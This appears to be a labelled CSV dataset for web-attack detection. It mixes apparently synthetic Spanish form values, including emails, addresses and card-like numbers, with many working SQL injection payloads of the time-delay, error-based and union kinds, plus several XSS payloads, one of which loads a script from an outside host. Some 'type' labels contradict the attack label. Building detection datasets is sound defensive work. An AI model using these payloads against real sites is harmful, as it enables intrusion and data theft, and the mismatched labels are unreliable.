Text,attack_type,Label,type
ceajo,norm,0,normal
45681,norm,0,normal
1%'));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"de las aguas, 196",norm,0,normal
29579903v,norm,0,normal
goldman@casabolsa43.rw,norm,0,normal
54tra03u38706,norm,0,normal
hsketh,norm,0,normal
dels,norm,0,normal
1677,norm,0,normal
"1' where 9605=9605 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
"1%"")));iif(5257=5257,1,1/0)",sqli,1,sql
fajardos espuna,norm,0,normal
s134a+reo,norm,0,normal
1%'))) waitfor delay '0:0:5'--,sqli,1,sql
reclinar,norm,0,normal
tarjetn,norm,0,normal
garek,norm,0,normal
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""mezx"" like ""mezx",sqli,1,sql
noblejas,norm,0,normal
"fivasa, 15,",norm,0,normal
ot5ora,norm,0,normal
gu9s8na,norm,0,normal
"1) and elt(3138=1817,1817)",sqli,1,normal
"1"") where 2602=2602 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
walberto,norm,0,normal
47gent1r,norm,0,normal
"1))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
rapetto picabea,norm,0,normal
4ibari8a,norm,0,normal
"1,(select (case when (6750=6750) then 1 else 6750*(select 6750 from information_schema.character_sets) end))",sqli,1,sql
"-3068%"")) union all select 6597,6597,6597,6597,6597,6597,6597,6597--",sqli,1,sql
1565,norm,0,normal
"1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
recincho,norm,0,normal
sa?balero,norm,0,normal
"1%"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""%""=""",sqli,1,sql
44,norm,0,normal
5668,norm,0,normal
5806,norm,0,normal
"1"") as giqb where 4664=4664;select case when 7717=7717 then 1 else null end--",sqli,1,sql
wostrikoff@hojainformativas.gi,norm,0,normal
63298862x,norm,0,normal
vila-rodona,norm,0,normal
valma,norm,0,normal
"1)) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((9914=9914",sqli,1,sql
1) as ztrb where 1052=1052 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
"1%' or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
37439,norm,0,normal
kurian,norm,0,normal
6019,norm,0,normal
"1') where 6746=6746 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
4051,norm,0,normal
"errekerte 113,",norm,0,normal
cami del fredolic 115,norm,0,normal
wynnie,norm,0,normal
5964,norm,0,normal
urbina granda,norm,0,normal
1);select sleep(5) and (4863=4863,sqli,1,sql
"-6618""))) order by 1#",sqli,1,normal
1'))) and 3602=1990#,sqli,1,normal
el-gueba,norm,0,normal
didier,norm,0,normal
1429,norm,0,normal
1738,norm,0,normal
patrica0,norm,0,normal
"1))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9184=9184",sqli,1,sql
escncido,norm,0,normal
sheng-passanante@ankawaelda.int,norm,0,normal
"<table id=xss><td background=""javascript:alert('xss')"">",xss,2,xss
1') and (1471=7892)*7892 and ('kkok' like 'kkok,sqli,1,normal
60,norm,0,normal
berghof@esbien.bt,norm,0,normal
telsfora,norm,0,normal
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",sqli,1,sql
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""ygzq"" like ""ygzq",sqli,1,sql
tr2cad4,norm,0,normal
de lagarza delacerda,norm,0,normal
"1'||(select 'dezl' where 8661=8661;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)||'",sqli,1,sql
jerez brecha,norm,0,normal
mentecapta,norm,0,normal
1' or 6793=(select 6793 from pg_sleep(5)) and 'dogx'='dogx,sqli,1,sql
"calle virgen de la estrella, 196",norm,0,normal
"1%')) and elt(4249=4249,7259) and (('%'='",sqli,1,normal
45478096n,norm,0,normal
camp fein,norm,0,normal
1'||(select 'goen' from dual where 8586=8586;select (case when (2132=8969) then 1 else 2132*(select 2132 from master..sysdatabases) end)--,sqli,1,sql
calle parque del huecar 75 6?a,norm,0,normal
8319,norm,0,normal
39638,norm,0,normal
whiteside.seyfferrtitz@cohel.uk,norm,0,normal
-1300) as rrsm where 1086=1086 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
48asta5o,norm,0,normal
lusa,norm,0,normal
casacuberta delacerda,norm,0,normal
"-8506'))) union all select 1950,1950,1950,1950,1950,1950--",sqli,1,sql
pravia,norm,0,normal
"1%"";begin dbms_lock.sleep(5); end--",sqli,1,sql
"1)) union all select null,null,null,null,null,null#",sqli,1,sql
1') where 2227=2227;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
46630334l,norm,0,normal
-4498) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2902=2902,sqli,1,sql
25,norm,0,normal
en8relan3amien0o,norm,0,normal
"-8999"" where 2821=2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",sqli,1,sql
gater9,norm,0,normal
"1"") union all select null,null,null,null#",sqli,1,sql
"1')) as mjps where 2179=2179 union all select null,null,null,null,null,null,null--",sqli,1,sql
legrand@viajesinternacionales.si,norm,0,normal
"1"") as eefe where 5290=5290 and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
bea,norm,0,normal
novisedl9,norm,0,normal
pavorde,norm,0,normal
inca,norm,0,normal
17179,norm,0,normal
4341,norm,0,normal
"(select (case when (1343=1343) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1343 end) from dual)",sqli,1,sql
6775762435738331,norm,0,normal
verschuer_greenleaf@cajucar.cx,norm,0,normal
madisett,norm,0,normal
"-1004"" where 6266=6266 order by 1#",sqli,1,normal
ayat rozas,norm,0,normal
29222370l,norm,0,normal
apulga*rar,norm,0,normal
a73p3i4,norm,0,normal
1364,norm,0,normal
"1%' and elt(7619=1489,1489) and '%'='",sqli,1,normal
0686860883890664,norm,0,normal
4761547357229973,norm,0,normal
"1) where 2720=2720 and elt(4249=4249,7259)--",sqli,1,sql
threader,norm,0,normal
rider,norm,0,normal
ohn,norm,0,normal
hagerthy.gilling@inoxled.az,norm,0,normal
mohandas,norm,0,normal
4171760827421606,norm,0,normal
1 where 5443=5443;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
andrs castanyer,norm,0,normal
6110,norm,0,normal
"cabaeros, 131",norm,0,normal
grelck,norm,0,normal
el taxista 199 10?c,norm,0,normal
bau pelayo,norm,0,normal
8515880791800894,norm,0,normal
villanueva del conde,norm,0,normal
fontanarejo,norm,0,normal
"1' and 3824=benchmark(5000000,md5(0x76555642))",sqli,1,normal
6ar10l30,norm,0,normal
1) as rlft where 1670=1670 waitfor delay '0:0:5'--,sqli,1,sql
10650,norm,0,normal
railey@g-audio.ic,norm,0,normal
03895518p,norm,0,normal
4211,norm,0,normal
c/ orient 45,norm,0,normal
lug5r,norm,0,normal
kristiansen-fineschi@bijoubijoudiferente.cl,norm,0,normal
troguet,norm,0,normal
guerra_russinov@weat.fj,norm,0,normal
49250,norm,0,normal
brocatel,norm,0,normal
"-9541) as bnky where 3934=3934 union all select 3934,3934,3934#",sqli,1,sql
marmont_doran@peliculasen3d.ng,norm,0,normal
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('wzrj'='wzrj",sqli,1,sql
sanidad,norm,0,normal
8352337916705491,norm,0,normal
"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('gwew' like 'gwew",sqli,1,sql
roque,norm,0,normal
1 where 5161=5161 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
rez,norm,0,normal
"1) as wbcd where 9506=9506 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'fmkz' like 'fmkz",sqli,1,sql
pegler,norm,0,normal
reth,norm,0,normal
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('xaoi'='xaoi",sqli,1,sql
t20s3da436,norm,0,normal
"-8651"") where 8391=8391 union all select 8391,8391#",sqli,1,sql
colosse@velaconsultores.gob,norm,0,normal
8400067402160298,norm,0,normal
23997242p,norm,0,normal
cap!tar,norm,0,normal
teitelba,norm,0,normal
oretana,norm,0,normal
"1) as amgf where 4308=4308 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
charmion,norm,0,normal
sariego,norm,0,normal
19281,norm,0,normal
elia6,norm,0,normal
75u1al3e,norm,0,normal
"1) union all select null,null,null,null,null,null,null--",sqli,1,sql
"1%""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""%""=""",sqli,1,sql
pedraza de campos,norm,0,normal
"c/ jacinto benavente 109, 10?d",norm,0,normal
"av. italia, 66, 4-a",norm,0,normal
50619,norm,0,normal
"1) as hvsk where 7902=7902;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
-4901) or 3407=6442#,sqli,1,normal
35093869d,norm,0,normal
"calle muelles, 70, 6g",norm,0,normal
villafrechs,norm,0,normal
9959095212447652,norm,0,normal
"-4340)) or make_set(9354=9354,7185) and ((8505=8505",sqli,1,normal
"1)) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((8294=8294",sqli,1,sql
"1"")) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
0o380ado6,norm,0,normal
vilaubi hosta,norm,0,normal
kamel@hiperespaa.hk,norm,0,normal
schwarz,norm,0,normal
45571518p,norm,0,normal
deiadrel,norm,0,normal
03248i367ca,norm,0,normal
iranzo,norm,0,normal
1' and 2908=8067--,sqli,1,sql
"1"")));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
ryan,norm,0,normal
vadosa,norm,0,normal
amoeiro,norm,0,normal
fernan-gomez@juegosgratisinternet.sj,norm,0,normal
b5s106c3dor,norm,0,normal
"-1272' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1%"" and 9198=9198--",sqli,1,sql
46688,norm,0,normal
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""gydr"" like ""gydr",sqli,1,sql
"1"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
milford1,norm,0,normal
17840,norm,0,normal
15896821a,norm,0,normal
patoka,norm,0,normal
"-5043%'))) union all select 5860,5860,5860,5860,5860#",sqli,1,sql
60106679c,norm,0,normal
sigfrido,norm,0,normal
hiplita,norm,0,normal
julisa,norm,0,normal
"1'+(select afst where 7454=7454 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1,sql
635l82rab74id35,norm,0,normal
09763,norm,0,normal
7242,norm,0,normal
"1"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""qycx"" like ""qycx",sqli,1,sql
6837813065545901,norm,0,normal
"c/ pla des monestir 4, 2c",norm,0,normal
chelva,norm,0,normal
putrino escortell,norm,0,normal
e00tr6o,norm,0,normal
subidor,norm,0,normal
"-9795) as wrgs where 5427=5427 union all select 5427,5427,5427,5427,5427,5427--",sqli,1,sql
">""<img src=""blah""onmouseover=""document.cookie=true;"">",xss,2,sql
0706862113489393,norm,0,normal
1') where 7478=7478;select pg_sleep(5)--,sqli,1,sql
kaz@3horas.com,norm,0,normal
regueras de arriba,norm,0,normal
c7lifa01,norm,0,normal
"1%"") and 3824=benchmark(5000000,md5(0x76555642)) and (""%""=""",sqli,1,normal
"froilan de la serna, 185",norm,0,normal
3068571897789618,norm,0,normal
kingslan,norm,0,normal
1' where 8469=8469;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
castroverde,norm,0,normal
liedtke_truhitte@ac-activos.gob,norm,0,normal
"1) as kqas where 7302=7302 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'kudh' like 'kudh",sqli,1,sql
b66762o,norm,0,normal
pangui,norm,0,normal
"1'+(select kqac where 4362=4362 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'zlxw'='zlxw",sqli,1,normal
"-8557 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
budia,norm,0,normal
-9541 where 4291=4291 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
7828706714204414,norm,0,normal
"1"") where 6478=6478 union all select null,null,null,null,null,null#",sqli,1,sql
prueckner@helicopter.com.gf,norm,0,normal
sixto,norm,0,normal
"1"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""vhey""=""vhey",sqli,1,sql
"1"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""kkim""=""kkim",sqli,1,sql
incr622to,norm,0,normal
burrud-gyoengyoessy@carloshoya.com.pr,norm,0,normal
"1"")) as tfjh where 1134=1134 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
4nemmetr6,norm,0,normal
"1))) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"1"") or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
rocky,norm,0,normal
iolav,norm,0,normal
06363808f,norm,0,normal
"-4033')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('ouup'='ouup",sqli,1,sql
61676468j,norm,0,normal
kriko,norm,0,normal
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""wueo""=""wueo",sqli,1,sql
"-2067"" or 3038=3038",sqli,1,normal
niemyska@inversioneolica.lt,norm,0,normal
"1)) as ambt where 5198=5198 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
sabinigo,norm,0,normal
-8710 or 9323=9323#,sqli,1,normal
6196716655513010,norm,0,normal
el-hawar,norm,0,normal
carteado,norm,0,normal
"-7469) where 5875=5875 or make_set(9354=9354,7185)--",sqli,1,sql
buc_falo,norm,0,normal
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('ewwi'='ewwi",sqli,1,sql
"1"") where 1392=1392 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
ligurs,norm,0,normal
pl. obra sindical del hogar 43 5-a,norm,0,normal
"calle cerrada, 94,",norm,0,normal
"1',(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))",sqli,1,sql
3j,norm,0,normal
28430,norm,0,normal
"1 where 2278=2278 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
"1"" where 9725=9725;waitfor delay '0:0:5'--",sqli,1,sql
c/ la calzada 10,norm,0,normal
jenner,norm,0,normal
6467099706129021,norm,0,normal
"plaza aparejador federico bermudez 139,",norm,0,normal
14602519a,norm,0,normal
"cuesta de la baronesa, 192",norm,0,normal
"1""))) and elt(4249=4249,7259) and (((""awyk"" like ""awyk",sqli,1,normal
cabaas del castillo,norm,0,normal
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",sqli,1,sql
anoa,norm,0,normal
"c/ cadiz, 161 8?c",norm,0,normal
"1') where 6387=6387 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
vilalba sasserra,norm,0,normal
lluv8os4,norm,0,normal
"1"") rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
1i6osa,norm,0,normal
"1"") and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
68133766s,norm,0,normal
"1%"") and 9764=6037 and (""%""=""",sqli,1,normal
"-6407') or elt(1631=4946,4946) and ('jpnz'='jpnz",sqli,1,normal
1'+(select wpkh where 5842=5842;select sleep(5))+',sqli,1,sql
"cami can manuel, 117,",norm,0,normal
7463689061986370,norm,0,normal
2e64n8m5,norm,0,normal
98820419e,norm,0,normal
arstides,norm,0,normal
pascual,norm,0,normal
"-3819'))) union all select 9014,9014,9014,9014,9014,9014--",sqli,1,sql
giorgi,norm,0,normal
1';select pg_sleep(5),sqli,1,sql
monforte del cid,norm,0,normal
9280522239849881,norm,0,normal
75716077p,norm,0,normal
"c/ pintor camaron, 88, 9?g",norm,0,normal
2532457145340118,norm,0,normal
25266,norm,0,normal
parra,norm,0,normal
radley,norm,0,normal
"1)) as aeat where 1007=1007 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
hemilce,norm,0,normal
"c/ luis braille 2, 10d",norm,0,normal
ianace,norm,0,normal
1'||(select 'vvpn' from dual where 7011=7011 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||',sqli,1,sql
8omba51a,norm,0,normal
1%';select case when 4656=3716 then 1 else null end--,sqli,1,sql
elbal cobo,norm,0,normal
"1%')) and make_set(8403=8403,8899) and (('%'='",sqli,1,normal
torre alhquime,norm,0,normal
4243993376239926,norm,0,normal
lieneman,norm,0,normal
"guipuzcoa 198, 1?d",norm,0,normal
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)# jcdh",sqli,1,normal
coladiza,norm,0,normal
16824275m,norm,0,normal
adelantamiento,norm,0,normal
rocafort de queralt,norm,0,normal
"-5160') as kgjw where 9609=9609 union all select 9609,9609--",sqli,1,sql
2936466219545326,norm,0,normal
"-6086"" union all select 8700,8700,8700,8700--",sqli,1,sql
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",sqli,1,sql
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('inrm' like 'inrm",sqli,1,normal
03557191b,norm,0,normal
"1""))) union all select null,null,null,null,null,null,null--",sqli,1,sql
1';begin user_lock.sleep(5); end--,sqli,1,sql
-9564 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,1,sql
"-4056""))) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",sqli,1,sql
patey@suncorp.st,norm,0,normal
1) where 2918=2918 and 7533=7533--,sqli,1,sql
1'||(select 'lxyu' from dual where 5789=5789 union all select null#,sqli,1,sql
sant quirze de besora,norm,0,normal
flis@14horas.gt,norm,0,normal
elido,norm,0,normal
valdepolo,norm,0,normal
aldearrodrigo,norm,0,normal
2368,norm,0,normal
c/ masca 45,norm,0,normal
"1') where 7322=7322 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
emad,norm,0,normal
"1%')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('%'='",sqli,1,sql
"<layer id=xss src=""http://ha.ckers.org/scriptlet.html""></layer>",xss,2,normal
1304,norm,0,normal
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)-- dtha",sqli,1,sql
abuuelada,norm,0,normal
"-8109%"")) union all select 9089,9089--",sqli,1,sql
17652259n,norm,0,normal
"1'+(select taga where 8036=8036;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"-9462"") as vzga where 4799=4799 or 8691=1048",sqli,1,normal
1'||(select 'znba' where 8323=8323;select pg_sleep(5)--,sqli,1,sql
50136,norm,0,normal
31170,norm,0,normal
"zoma, la",norm,0,normal
2821707836126747,norm,0,normal
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",sqli,1,sql
"1) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
"1%""))) rlike (select * from (select(sleep(5)))sgvo) and (((""%""=""",sqli,1,sql
gianina,norm,0,normal
"1"")(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (""usht"" like ""usht",sqli,1,sql
"='><script>alert(""xss"")</script>",xss,2,xss
i4dig6st8bl9,norm,0,normal
"calle de can castellvi 35, 10-h",norm,0,normal
1') and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
02100,norm,0,normal
"1';select like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,sql
"-1490'||(select 'uzbm' from dual where 3181=3181 union all select 3181,3181,3181,3181,3181--",sqli,1,sql
"1%')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('%'='",sqli,1,sql
"c/ valdes salas, 39 11?c",norm,0,normal
"1 where 3478=3478 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
1))) and sleep(5) and (((6618=6618,sqli,1,normal
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,sqli,1,normal
"-3963"" or 1224=5119",sqli,1,normal
greenlee,norm,0,normal
lewwis.mall@epbx.pg,norm,0,normal
cordita,norm,0,normal
""";alert('xss');//",xss,2,sql
claudine,norm,0,normal
1) where 3671=3671;(select * from (select(sleep(5)))srmq)--,sqli,1,sql
"1) where 3030=3030;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
99999464h,norm,0,normal
paleteo,norm,0,normal
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('dqjq'='dqjq",sqli,1,sql
1059842916427607,norm,0,normal
"-1816"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""dztr"" like ""dztr",sqli,1,sql
3182733189788703,norm,0,normal
"c/ duran 52,",norm,0,normal
26586,norm,0,normal
brihuega uslet,norm,0,normal
5102826995528190,norm,0,normal
1));begin dbms_lock.sleep(5); end and ((2160=2160,sqli,1,sql
0488545604364372,norm,0,normal
onomstico,norm,0,normal
scavran@eonon.com.at,norm,0,normal
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""qzzg"" like ""qzzg",sqli,1,sql
0e8v88e,norm,0,normal
8167,norm,0,normal
"1)) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
pardip,norm,0,normal
41564,norm,0,normal
"1"") as idwa where 2545=2545 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
09275,norm,0,normal
1;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
9755,norm,0,normal
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))",sqli,1,sql
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
1')) as cpwx where 5378=5378 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
zoratti,norm,0,normal
"1') as mmhe where 2142=2142 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,1,sql
"<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//",xss,2,xss
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""bxcb"" like ""bxcb",sqli,1,sql
marsa plomer,norm,0,normal
filomena,norm,0,normal
